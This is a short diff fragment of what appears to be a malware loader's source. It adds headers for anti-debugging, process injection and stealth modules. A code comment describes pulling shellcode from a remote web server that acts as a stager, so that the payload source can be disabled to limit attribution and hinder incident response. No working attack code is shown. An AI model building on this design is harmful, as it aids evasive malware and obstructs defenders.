@@ -5,6 +5,9 @@
 #include "ApiResolver.h" // Include the new API resolver
 #include "Crypto.h"      // Include the new crypto functions
 #include "Memory.h"      // Include the new memory functions
+#include "AntiDebug.h"   // Include AntiDebug module
+#include "Injection.h"   // Include Injection module
+#include "Stealth.h"     // Include Stealth module
 //#include <wininet.h>
 /*  ^ keeping this cuz if i include getting shellcode via http on specified web server(acts as a stager) so that if
 payload gets caught you can disable whereever you saved the shellcode remotely to limit attribution and make IR a little harder
